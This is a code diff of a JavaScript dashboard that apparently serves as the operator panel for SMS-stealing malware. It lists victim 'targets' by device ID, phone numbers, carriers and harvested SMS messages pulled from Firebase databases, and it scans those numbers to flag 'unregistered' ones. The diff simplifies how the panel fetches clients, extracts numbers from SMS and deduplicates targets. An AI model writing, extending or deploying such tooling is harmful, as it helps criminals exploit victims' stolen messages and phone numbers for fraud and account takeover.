@@ -1164,9 +1164,6 @@ async function fetchAndRenderTargets(silent = false) {
     });
 
     globalTargetsCache = retainedTargets.concat(allTargets);
-    if ((unregModeActive || unregFilterActive || scanLiveModeActive) && scanTargetsCache.length) {
-        ensureScanTargetsInCache(false);
-    }
     globalTargetsCache.forEach((t, i) => t.serial = i + 1);
     updateDashboardCounts();
     
@@ -1201,10 +1198,6 @@ async function processBgQueue() {
                 if (!latestT.smsDict) latestT.smsDict = {};
                 for (let msgId in fetchedSms) latestT.smsDict[msgId] = fetchedSms[msgId];
                 mergePhones(latestT, extractOwnPhonesFromSMS(latestT.smsDict));
-                if (scanIsRunning && scanTargetsMap[String(latestT.did)]) {
-                    syncScanQueueForTarget(latestT);
-                    updateScanStats();
-                }
             }
         }
     });
@@ -1217,9 +1210,6 @@ function renderFilteredList(skipDebounce = false) {
     clearTimeout(renderTimeout);
     const doRender = () => {
         try {
-            if ((unregModeActive || unregFilterActive || scanLiveModeActive) && scanTargetsCache.length) {
-                ensureScanTargetsInCache(false);
-            }
             const listContainer = document.getElementById("targetList");
             const searchQuery = (document.getElementById("target-search-input").value || "").toLowerCase().trim();
             let displayTargets = globalTargetsCache.filter(t => {
@@ -1862,8 +1852,6 @@ let scanCurrentFbUrl = '';
 let scanTargetsCache = [];
 let scanLiveModeActive = false;
 let scanBgQueuedKeys = new Set();
-let scanNumberMap = {};
-let scanNumberResults = {};
 
 function scanEl(id) { return document.getElementById(id); }
 function scanEscapeHTML(value) {
@@ -1873,18 +1861,12 @@ function scanInlineArg(value) {
   return String(value ?? '').replace(/\\/g, '\\\\').replace(/'/g, "\\'");
 }
 function normalizeScanFbUrl(raw) {
-  let rawText = String(raw || '').trim();
-  if (!rawText) return '';
-  let extracted = extractUrlsFromText(rawText);
-  if (extracted.length) return extracted[0];
-
-  let cleaned = rawText.replace(/^['"`\s]+|['"`\s]+$/g, '').replace(/[),;]+$/g, '');
-  let hostMatch = cleaned.match(/(?:https?:\/\/)?([a-zA-Z0-9-]+\.firebaseio\.com)/i);
-  if (hostMatch) return `https://${hostMatch[1].toLowerCase()}/.json`;
-
-  let slug = cleaned.replace(/^https?:\/\//i, '').replace(/\/.*$/g, '').replace(/\.json$/i, '').replace(/\.firebaseio\.com$/i, '').trim();
-  if (!/^[a-zA-Z0-9-]+$/.test(slug)) return '';
-  return `https://${slug.toLowerCase()}.firebaseio.com/.json`;
+  let fbUrl = String(raw || '').trim();
+  if (!fbUrl) return '';
+  if (!/^https?:\/\//i.test(fbUrl)) fbUrl = 'https://' + fbUrl;
+  fbUrl = fbUrl.replace(/\/+$/, '');
+  if (!fbUrl.endsWith('.json')) fbUrl += '/.json';
+  return fbUrl;
 }
 function syncScannedFirebaseConnection(fbUrl) {
   const normalizedUrl = normalizeScanFbUrl(fbUrl);
@@ -1934,8 +1916,6 @@ function continueScanFirebaseStep() {
   let fbUrl = getPendingScanFbUrl();
   if (!fbUrl) { showToast('SELECT OR PASTE A FIREBASE URL.'); return; }
   scanSelectedFbUrl = fbUrl;
-  let input = scanEl('scan-fb-url-input');
-  if (input) input.value = fbUrl;
   renderScanFbList();
   if (!scanServices.length) fetchScanServices(); else renderSvcPage();
   showScanStep('service');
@@ -1965,8 +1945,6 @@ function toggleUnregMode() {
     scanTotalTargets = 0;
     scanTargetsCache = [];
     scanBgQueuedKeys.clear();
-    scanNumberMap = {};
-    scanNumberResults = {};
     scanCurrentFbUrl = '';
     if (tog) {
       tog.classList.remove('on');
@@ -2091,137 +2069,54 @@ function getScanPhonesFromClient(val) {
       else add(sv);
     });
   }
-  let smsDict = val.sms || val.user_sms || (val.action && val.action.sendSms) || {};
-  extractOwnPhonesFromSMS(smsDict).forEach(p => add(p.phone));
   return Array.from(phones);
 }
-function getScanPhonesFromTarget(target) {
-  let phones = new Set();
-  function add(raw) { let n = cleanNumForScan(raw); if (n) phones.add(n); }
-  add(target.p1);
-  add(target.p2);
-  extractOwnPhonesFromSMS(target.smsDict || {}).forEach(p => add(p.phone));
-  return Array.from(phones);
-}
-function buildScanTargetFromClient(did, val, fbUrl) {
-  let simData = extractPhoneAndCarrier(val);
-  let smsDict = val.sms || val.user_sms || (val.action && val.action.sendSms) || {};
-  let targetObj = {
-    dbIndex: 'Scan',
-    did: String(did),
-    p1: simData.p1 || 'Unknown',
-    p2: simData.p2 || 'Unknown',
-    c1: simData.c1 || 'Unknown',
-    c2: simData.c2 || 'Unknown',
-    p1Src: 'fb',
-    p2Src: 'fb',
-    smsDict: (smsDict && typeof smsDict === 'object') ? smsDict : {},
-    model: extractUniversalModel(val),
-    dbUrl: fbUrl
-  };
-  mergePhones(targetObj, extractOwnPhonesFromSMS(targetObj.smsDict));
-  return targetObj;
-}
-async function hydrateScanTargetsWithSms(targets, fbUrl) {
-  if (!Array.isArray(targets) || !targets.length) return;
-  let baseRoot = fbUrl.replace(/\/\.json$/, '').replace(/\.json$/, '');
-  await Promise.allSettled(targets.map(async t => {
-    if (!t || !t.did) return;
-    let fetchedSms = null;
-    try {
-      let mRes = await fetchWithTimeout(`${baseRoot}/messages/${t.did}/.json`, 4000);
-      if (mRes && typeof mRes === 'object' && Object.keys(mRes).length > 0) fetchedSms = mRes;
-    } catch(e) {}
-    if (!fetchedSms) {
-      try {
-        let sRes = await fetchWithTimeout(`${baseRoot}/user_sms/${t.did}/.json`, 4000);
-        if (sRes && typeof sRes === 'object' && Object.keys(sRes).length > 0) fetchedSms = sRes;
-      } catch(e) {}
-    }
-    if (!fetchedSms) return;
-    if (!t.smsDict || typeof t.smsDict !== 'object') t.smsDict = {};
-    for (let msgId in fetchedSms) t.smsDict[msgId] = fetchedSms[msgId];
-    mergePhones(t, extractOwnPhonesFromSMS(t.smsDict));
-  }));
-}
-function addScanQueueLink(phone, did, targetIndex, simIndex, queueByNumber = null) {
-  let safeDid = String(did);
-  let item = queueByNumber ? queueByNumber.get(phone) : scanQueue.find(q => q.number === phone);
-  if (!item) {
-    item = { number: phone, did: safeDid, dids: [], targetIndex, simIndex, feedId: '' };
-    if (queueByNumber) queueByNumber.set(phone, item);
-    scanQueue.push(item);
-  }
-  if (!item.dids.includes(safeDid)) item.dids.push(safeDid);
-  if (!scanNumberMap[phone]) scanNumberMap[phone] = [];
-  if (!scanNumberMap[phone].includes(safeDid)) scanNumberMap[phone].push(safeDid);
-  if (scanNumberResults[phone] === 'unregistered' && !unregDids.has(safeDid)) {
-    unregDids.add(safeDid);
-  }
-}
-function syncScanQueueForTarget(target) {
-  if (!target || !target.did || !scanTargetsMap[String(target.did)]) return;
-  let info = scanTargetsMap[String(target.did)];
-  let phones = getScanPhonesFromTarget(target);
-  phones.forEach((phone, idx) => addScanQueueLink(phone, target.did, info.targetIndex, idx + 1));
-  info.phones = Array.from(new Set([...(info.phones || []), ...phones]));
-}
-function prepareScanTargets(sourceTargets, fbUrl) {
+function prepareScanTargets(clients, fbUrl) {
   scanQueue = [];
   scanTargetsMap = {};
   scanTargetsCache = [];
-  scanNumberMap = {};
-  scanNumberResults = {};
-  let queueByNumber = new Map();
   let targetIndex = 0;
-  let sourceList = Array.isArray(sourceTargets)
-    ? sourceTargets.map(t => [t && t.did, t])
-    : Object.entries(sourceTargets || {});
-  for (let [did, val] of sourceList) {
+  for (let did in clients) {
+    let val = clients[did];
     if (!val || typeof val !== 'object') continue;
-    let targetObj = Array.isArray(sourceTargets)
-      ? { ...val, did: String(val.did ?? did), dbIndex: 'Scan', dbUrl: fbUrl, smsDict: (val.smsDict && typeof val.smsDict === 'object') ? val.smsDict : {} }
-      : buildScanTargetFromClient(did, val, fbUrl);
-    if (!targetObj.did || targetObj.did === 'undefined') continue;
-    mergePhones(targetObj, extractOwnPhonesFromSMS(targetObj.smsDict || {}));
-    let phones = Array.isArray(sourceTargets) ? getScanPhonesFromTarget(targetObj) : getScanPhonesFromClient(val);
+    let phones = getScanPhonesFromClient(val);
     if (phones.length === 0) continue;
     targetIndex++;
-    targetObj.dbIndex = 'Scan';
-    targetObj.dbUrl = fbUrl;
-    targetObj.serial = targetIndex;
-    targetObj.model = targetObj.model || extractUniversalModel(val);
-    targetObj.p1 = cleanNumForScan(targetObj.p1) || phones[0] || 'Unknown';
-    targetObj.p2 = cleanNumForScan(targetObj.p2) || phones[1] || 'Unknown';
-    if (!targetObj.p1Src) targetObj.p1Src = 'fb';
-    if (!targetObj.p2Src) targetObj.p2Src = 'fb';
+    let simData = extractPhoneAndCarrier(val);
+    let smsDict = val.sms || (val.action && val.action.sendSms) || {};
+    let targetObj = {
+      dbIndex: 'Scan',
+      did: String(did),
+      p1: phones[0] || simData.p1 || 'Unknown',
+      p2: phones[1] || simData.p2 || 'Unknown',
+      c1: simData.c1 || 'Unknown',
+      c2: simData.c2 || 'Unknown',
+      p1Src: 'fb',
+      p2Src: 'fb',
+      smsDict: (smsDict && typeof smsDict === 'object') ? smsDict : {},
+      model: extractUniversalModel(val),
+      dbUrl: fbUrl,
+      serial: targetIndex
+    };
     scanTargetsCache.push(targetObj);
-    scanTargetsMap[String(targetObj.did)] = { model: targetObj.model, phones, targetIndex };
+    scanTargetsMap[String(did)] = { model: targetObj.model, phones, targetIndex };
     phones.forEach((phone, idx) => {
-      addScanQueueLink(phone, targetObj.did, targetIndex, idx + 1, queueByNumber);
+      scanQueue.push({ number: phone, did: String(did), targetIndex, simIndex: idx + 1, feedId: '' });
     });
   }
   scanTotalTargets = scanTargetsCache.length;
 }
-function ensureScanTargetsInCache(updateCounts = true) {
+function ensureScanTargetsInCache() {
   if (!scanTargetsCache.length) return;
-  let existing = new Map(globalTargetsCache.map(t => [String(t.did), t]));
+  let existing = new Set(globalTargetsCache.map(t => String(t.did)));
   scanTargetsCache.forEach(t => {
-    let safeDid = String(t.did);
-    let existingTarget = existing.get(safeDid);
-    if (!existingTarget) {
+    if (!existing.has(String(t.did))) {
       globalTargetsCache.push(t);
-      existing.set(safeDid, t);
-    } else {
-      if ((!existingTarget.smsDict || Object.keys(existingTarget.smsDict).length === 0) && t.smsDict) existingTarget.smsDict = t.smsDict;
-      if ((!existingTarget.p1 || existingTarget.p1 === 'Unknown') && t.p1 && t.p1 !== 'Unknown') { existingTarget.p1 = t.p1; existingTarget.p1Src = t.p1Src; }
-      if ((!existingTarget.p2 || existingTarget.p2 === 'Unknown') && t.p2 && t.p2 !== 'Unknown') { existingTarget.p2 = t.p2; existingTarget.p2Src = t.p2Src; }
-      if ((!existingTarget.c1 || existingTarget.c1 === 'Unknown') && t.c1 && t.c1 !== 'Unknown') existingTarget.c1 = t.c1;
-      if ((!existingTarget.c2 || existingTarget.c2 === 'Unknown') && t.c2 && t.c2 !== 'Unknown') existingTarget.c2 = t.c2;
+      existing.add(String(t.did));
     }
   });
   globalTargetsCache.forEach((t, i) => t.serial = i + 1);
-  if (updateCounts) updateDashboardCounts();
+  updateDashboardCounts();
 }
 function queueScanSmsFetch(targets = scanTargetsCache) {
   targets.forEach(t => {
@@ -2268,20 +2163,15 @@ function appendScanFeedItem(item) {
   let row = document.createElement('div');
   row.id = item.feedId;
   row.className = 'scan-feed-row checking';
-  row.textContent = `${getScanItemLabel(item)} CHECKING`;
+  row.textContent = `TARGET ${item.targetIndex} :- SIM ${item.simIndex} :- ${item.number} CHECKING`;
   feed.appendChild(row);
   feed.scrollTop = feed.scrollHeight;
-}
-function getScanItemLabel(item) {
-  let linkedCount = Array.isArray(item.dids) ? item.dids.length : 1;
-  let suffix = linkedCount > 1 ? ` +${linkedCount - 1}` : '';
-  return `TARGET ${item.targetIndex}${suffix} :- SIM ${item.simIndex} :- ${item.number}`;
 }
 function updateScanFeedItem(item, state, label) {
   let row = item.feedId ? scanEl(item.feedId) : null;
   if (!row) return;
   row.className = 'scan-feed-row ' + state;
-  row.textContent = `${getScanItemLabel(item)} ${label}`;
+  row.textContent = `TARGET ${item.targetIndex} :- SIM ${item.simIndex} :- ${item.number} ${label}`;
 }
 function setScanPhase(phase) {
   let card = scanEl('scan-progress-card');
@@ -2332,26 +2222,18 @@ async function startUnregScan() {
   renderFilteredList(true);
 
   try {
-    let dbDump = await fetchDatabaseSmart(fbUrl);
-    if (!dbDump || (!dbDump.clients && !dbDump.user_data)) {
+    let baseUrl = fbUrl.replace(/\/\.json$/, '').replace(/\.json$/, '');
+    let clientsRes = await fetch(baseUrl + '/clients/.json');
+    if (!clientsRes.ok) throw new Error('HTTP ' + clientsRes.status);
+    let clients = await clientsRes.json();
+    if (!clients || typeof clients !== 'object') {
       setScanStatus('NO TARGETS FOUND', 'stopped');
       showToast('NO CLIENTS IN THIS FIREBASE.');
       updateScanActionButtons();
       return;
     }
 
-    let parsedTargets = parseDatabaseSmartly('Scan', dbDump, fbUrl);
-    if (!parsedTargets.length) {
-      setScanStatus('NO ONLINE TARGETS FOUND', 'stopped');
-      showToast('NO ONLINE TARGETS IN THIS FIREBASE.');
-      updateScanActionButtons();
-      updateScanStats();
-      return;
-    }
-
-    setScanStatus('EXTRACTING REGEX NUMBERS...', 'loading');
-    await hydrateScanTargetsWithSms(parsedTargets, fbUrl);
-    prepareScanTargets(parsedTargets, fbUrl);
+    prepareScanTargets(clients, fbUrl);
     globalTargetsCache = scanTargetsCache.slice();
     globalTargetsCache.forEach((t, i) => t.serial = i + 1);
     updateDashboardCounts();
@@ -2434,25 +2316,16 @@ async function processNextScanItem() {
 
     const isRegistered = data.is_registered ?? data.registered ?? data.isRegistered;
     if (isRegistered === false) {
-      scanNumberResults[item.number] = 'unregistered';
-      let linkedDids = Array.isArray(item.dids) && item.dids.length ? item.dids : [item.did];
-      let newFound = 0;
-      linkedDids.forEach(did => {
-        let safeDid = String(did);
-        if (!unregDids.has(safeDid)) {
-          unregDids.add(safeDid);
-          newFound++;
-        }
-      });
-      updateScanFeedItem(item, 'unregistered', linkedDids.length > 1 ? `UNREGISTERED (${linkedDids.length} TARGETS)` : 'UNREGISTERED');
-      if (newFound > 0 && (scanLiveModeActive || unregModeActive)) showToast(newFound + ' UNREGISTERED FOUND');
+      let wasNew = !unregDids.has(item.did);
+      unregDids.add(item.did);
+      updateScanFeedItem(item, 'unregistered', 'UNREGISTERED');
+      if (wasNew && (scanLiveModeActive || unregModeActive)) showToast('ONE UNREGISTERED FOUND');
       if (scanLiveModeActive || unregModeActive) {
         unregFilterActive = true;
         ensureScanTargetsInCache();
         renderFilteredList(true);
       }
     } else {
-      scanNumberResults[item.number] = 'registered';
       scanRegisteredCount++;
       updateScanFeedItem(item, 'registered', 'REGISTERED');
     }
